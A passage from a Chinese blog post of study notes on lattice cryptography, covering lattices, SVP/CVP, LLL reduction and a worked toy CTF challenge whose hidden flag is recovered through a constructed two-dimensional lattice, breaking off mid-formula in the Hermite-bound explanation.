        <content type="html"><![CDATA[<h1 id="格密码相关">格密码相关</h1><h2 id="格密码基本概念-属于后量子密码">格密码基本概念（属于后量子密码）</h2><p>后量子密码指的是对抗未来量子计算快速解决的问题</p><p>==向量空间：==</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535665.png" alt="image-20240217175813367"></p><p>==格：==</p><p>格本身就是一个系数为<strong>整数</strong>的向量空间</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535666.png" alt="image-20240217175944548"></p><ul><li><p>一系列向量集合（vector）v<sub>1</sub> , v<sub>2</sub> , v<sub>3</sub> , v<sub>n</sub></p></li><li><p>一系列整数a<sub>1</sub> , a<sub>2</sub> ,…, a<sub>n</sub></p></li><li><p>上面两个东西进行向量的线性组合就得到了格子（Lattices）即L = {a<sub>1</sub>v<sub>1</sub>+…+a<sub>n</sub>v<sub>n</sub>}</p></li></ul><p>直观感受一个最简单的格：</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535667.png" alt="image-20240217180326238"></p><p>在上面这个图中，每一个交点都是格上的一个格点，其基向量是（0,1）和（1,0）</p><p>该格用数学符号表示为：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">L=\begin{bmatrix}0&amp;1\\1&amp;0\\\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span></span></p><p>根据不同的基向量，我们可以得到不同的格点：</p><blockquote><p>比如选择（1，1）和（1，-1）作为基向量，因为系数要取整数，所以（1,0）这个点就是这两个基向量张成的格中不存在的格点</p></blockquote><p>格的维数：即向量的个数，上面这个就表示二维的格</p><p>然后根据整数系数a的不同 就可以形成很多个不同的L集合</p><p>假定v<sub>1</sub> , v<sub>2</sub> , … , v<sub>n</sub> （称为张成空间）是格L的基 然后存在不同个集合属于L 即w<sub>1</sub> , w<sub>2</sub> ,… , w<sub>m</sub></p><p>则有（属于线性组合）</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535668.png" alt="image-20230827000008282"></p><p>到此格的问题转化为矩阵的运算</p><blockquote><p>线性无关（linearly independence）v<sub>1</sub> , v<sub>2</sub> , … , v<sub>n</sub>线性无关，当且仅当方程a<sub>1</sub>v<sub>1</sub>+…+a<sub>n</sub>v<sub>n</sub>=0的唯一解是a全部为0；否则线性相关（linearly dependent）</p></blockquote><blockquote><p>正交基（orthogonal basis）v<sub>1</sub> , v<sub>2</sub> , … , v<sub>n</sub> 中任意不同的两个v点积的结果为0</p><p>规范正交（orthonormal） 上面的每一个v的**欧几里得范数(类似于模 长度)**为1</p><p>据此在上面的w的||w||<sup>2</sup> = 所有系数a的平方和</p></blockquote><h2 id="基础的格运算-行列式运算">基础的格运算（行列式运算）</h2><p>举栗子：</p><p>选定基向量生成格子L：<img src="https://gitee.com/happy_superman/happy/raw/master/202408021535669.png" alt="image-20230827115527756"></p><p>将其作为行向量写成矩阵：</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535670.png" alt="image-20230827115559284"></p><p>假设L的其他向量组为：<img src="https://gitee.com/happy_superman/happy/raw/master/202408021535672.png" alt="image-20230827115630795"></p><p>提取其系数a 形成矩阵：<img src="https://gitee.com/happy_superman/happy/raw/master/image-20230827115656983.png" alt="image-20230827115656983"></p><p>得到w的值（对应每一列列向量代表w）：<img src="https://gitee.com/happy_superman/happy/raw/master/202408021535673.png" alt="image-20230827115719984"></p><p>B = （w1,w2,w3）</p><p>所以A = B * U<sup>-1</sup> <img src="https://gitee.com/happy_superman/happy/raw/master/202408021535674.png" alt="image-20230827115810655"></p><p>故v1 = 4w1 -2w2 -w3</p><p>代码验证：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line">v1 = [<span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>]</span><br><span class="line">v2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>]</span><br><span class="line">v3 = [<span class="number">2</span>, -<span class="number">3</span>, -<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">A = matrix([v1, v2, v3])</span><br><span class="line"><span class="built_in">print</span>(A)</span><br><span class="line"><span class="comment"># [ 2  1  3]</span></span><br><span class="line"><span class="comment"># [ 1  2  0]</span></span><br><span class="line"><span class="comment"># [ 2 -3 -5]</span></span><br><span class="line"></span><br><span class="line">U = matrix([[<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, -<span class="number">1</span>, <span class="number">2</span>], [<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>]])</span><br><span class="line"><span class="built_in">print</span>(U)</span><br><span class="line"><span class="comment"># [ 1  0  1]</span></span><br><span class="line"><span class="comment"># [ 1 -1  2]</span></span><br><span class="line"><span class="comment"># [ 1  2  0]</span></span><br><span class="line"><span class="built_in">print</span>(U.det())</span><br><span class="line"><span class="comment"># -1</span></span><br><span class="line"></span><br><span class="line">B = U*A</span><br><span class="line"><span class="built_in">print</span>(B)</span><br><span class="line"><span class="comment"># [ 4 -2 -2]</span></span><br><span class="line"><span class="comment"># [ 5 -7 -7]</span></span><br><span class="line"><span class="comment"># [ 4  5  3]</span></span><br><span class="line"></span><br><span class="line">inv_U = U.inverse() <span class="comment">#求矩阵的逆</span></span><br><span class="line"><span class="built_in">print</span>(inv_U)</span><br><span class="line"><span class="comment"># [ 4 -2 -1]</span></span><br><span class="line"><span class="comment"># [-2  1  1]</span></span><br><span class="line"><span class="comment"># [-3  2  1]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> inv_U * B == A</span><br></pre></td></tr></table></figure><h3 id="svp-shortest-vector-problem-最短向量问题">SVP（shortest Vector Problem）最短向量问题</h3><p>我们根据开篇的内容可以看到一个格L这个集合中会存在无线多个向量集合v</p><p>所以最短向量问题 就是指在这一个格L中最短的非零向量 即寻找一个v满足<strong>欧几里得范数</strong>最小（指该集合的每一个元素的平方和再开方）范数就是指长度</p><p>此外格中的最短向量可能不止一个，举个例子:</p><blockquote><p>向量（0,1）和（1,0）张成的格</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535675.png" alt="image-20240217234639936"></p></blockquote><p>求解前置知识：</p><p>==基：==</p><p>在向量空间的每一个点，都可以通过对基的线性组合变化得到，叫做基向量</p><p>一个格可能会有很多个基 不唯一</p><p>==正交基：==</p><p>基相互垂直，就是正交基</p> <img src="https://gitee.com/happy_superman/happy/raw/master/202408021535676.png" alt="image-20240328145555052" style="zoom:50%;" /><p>==格基规约：==</p><p>目的就是：找到最接近正交基的基向量</p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535677.png" alt="image-20240328150052301" style="zoom: 25%;" /><p>random basis也是一组基，可以构成这个格子中的所有点 但是不是正交基</p><p>通过LLL或BKZ算法 得到正交基或者是最接近正交基</p><blockquote><p>此时思考：我们找这个正交基目的是什么，为什么要找这个正交基呢，它有什么用吗？</p></blockquote><p>目的在于：寻找最短向量v 也就是SVP问题</p><p>先找到正交基或者最接近正交基的基 进而证明我们的最短向量一定在这组基上</p><p>存在两种关系：</p><ol><li>假设v是这个基中的某个向量，在其他向量上的投影长度为0，两两垂直，符合SVP</li><li>假设v不是基中的向量，此刻该向量一定可以通过在<strong>其他基向量方向</strong>的投影来得到一个更短的向量</li></ol> <img src="https://gitee.com/happy_superman/happy/raw/master/202408021535678.png" alt="image-20240328153259984" style="zoom:33%;" /><p>垂直投影更短</p><h3 id="cvp-closet-vector-problem-最近向量问题">CVP（Closet Vector Problem）最近向量问题</h3><p>格外向量w和格内向量v的差值的欧几里得范数最小</p><blockquote><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535679.png" alt="image-20240217234653147"></p></blockquote><ul><li>与SVP的关系：有些问题可以通过对CVP加上一维之后转变为SVP问题，因为SVP相比CVP稍微简单一些</li></ul><h2 id="做题要点-key-超重点-明白这个到底是在干什么">做题要点（Key）超重点！！！！！！ 明白这个到底是在干什么</h2><p>经过前面基础知识的铺垫与学习，下面就要进行实战操作了，但是在实战开始之前，我们得把我们学到的内容转化成武器，这一过程非常重要。</p><p>首先在求解格密码的问题的时候，我们经常用到LLL算法，但是我们需要思考这个LLL算法的本质，为什么通过 LLL算法后得到的结果，就是我们想要得到的结果，这个进行LLL算法的格有什么要求吗，如何构造这样一个格呢，如果每次看到题目套模板，能做的题目真的是寥寥无几，所以要明白这个算法到底是在干什么的，如何去构造！</p><p>下面的学习内容是从DexterJie师傅的<a href="https://dexterjie.github.io/2023/07/28/%E5%88%9D%E8%AF%86%E6%A0%BC/?highlight=%E6%A0%BC#%E6%A0%BC%E4%B8%AD%E9%9A%BE%E9%A2%98">博客</a></p><p><a href="http://task.py">task.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">g = getPrime(<span class="number">128</span>)</span><br><span class="line">h = gmpy2.invert(f+<span class="number">20192020202120222023</span>, p) * g % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;h =&#x27;</span>, h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>, p)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">h = 2230300126583677861466927910427460605336142000604400796769019169330805327830058127399640469637301157563524664730082687590109425103649095203274991089542329</span></span><br><span class="line"><span class="string">p = 6950733137747588463708927295050453925761832477377823596882238234496472403054344156839969133381577140118982692621000380716326275220824006196311323447685281</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>分析一下题目：</p><p>目标求f</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>f</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mi>f</mi><mo>+</mo><mn>20192020202120222023</mn><mspace linebreak="newline"></mspace><mi>h</mi><mo>=</mo><mi>i</mi><mi>n</mi><mi>v</mi><mi>e</mi><mi>r</mi><mi>t</mi><mo stretchy="false">(</mo><msup><mi>f</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><mi>p</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>g</mi><mi mathvariant="normal">%</mi><mi>p</mi><mspace linebreak="newline"></mspace><mi>h</mi><mo>=</mo><msup><mi>f</mi><mrow><mo mathvariant="normal">′</mo><mrow><mo>−</mo><mn>1</mn></mrow></mrow></msup><mo>∗</mo><mi>g</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>h</mi><mo>=</mo><msup><mi>f</mi><mrow><mo mathvariant="normal">′</mo><mrow><mo>−</mo><mn>1</mn></mrow></mrow></msup><mo>∗</mo><mi>g</mi><mo>+</mo><mi>k</mi><mi>p</mi><mspace linebreak="newline"></mspace><mi>g</mi><mo>=</mo><mi>h</mi><msup><mi>f</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>−</mo><mi>k</mi><mi>p</mi><mspace linebreak="newline"></mspace><mtext>构造格</mtext><mspace linebreak="newline"></mspace><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mi>f</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>k</mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>h</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>p</mi></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mi>f</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>g</mi></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">f&#x27; = f +20192020202120222023 \\h = invert(f&#x27;,p)*g\%p \\h = f&#x27;^{-1}*g~(mod~p) \\h = f&#x27;^{-1}*g + kp \\g = hf&#x27; - kp \\构造格 \\\left(\begin {array}{c}f&#x27; &amp;-k \\\end{array}\right)\left(\begin {array}{c}1 &amp;h \\0 &amp;p \\\end{array}\right)=\left(\begin {array}{c}f&#x27; &amp;g \\\end{array}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.996332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">1</span><span class="mord">9</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">2</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">3</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.051892em;vertical-align:-0.25em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.94444em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord">%</span><span class="mord mathdefault">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.058548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace nobreak"> </span><span class="mord mathdefault">p</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.058548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.996332em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">h</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">构</span><span class="mord cjk_fallback">造</span><span class="mord cjk_fallback">格</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">h</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span></span></p><p>构造完这个式子之后，对二维矩阵进行LLL算法的结果就是我们想求的值</p><p>那么为什么会这样呢</p><p>这个时候就要回顾到LLL算法的作用，把（1，h）和（0，p）这组基变成正交化程度最大的一组基，去求解最短向量，所以只需要证明这个（f‘，g）是最短向量，那么我们上面的式子就全部讲的通了</p><h3 id="hermite定理">Hermite定理</h3><p>引入Hermite定理，给出了最短向量的上界 参考：<a href="https://www.ruanx.net/lattice-5/">格密码笔记</a></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535680.png" alt="image-20240521130132678"></p><p>其中n表示维度，也就是基向量的个数，在本题中n = 2</p><p>det(L) = 行列式的值  = 1 * p = p</p><p>故：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>v</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mo>≤</mo><msqrt><mrow><mi>n</mi><mi>p</mi></mrow></msqrt><mo>=</mo><msqrt><mrow><mn>2</mn><mi>p</mi></mrow></msqrt></mrow><annotation encoding="application/x-tex">||v|| \leq \sqrt {np} = \sqrt {2p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord">∣</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" 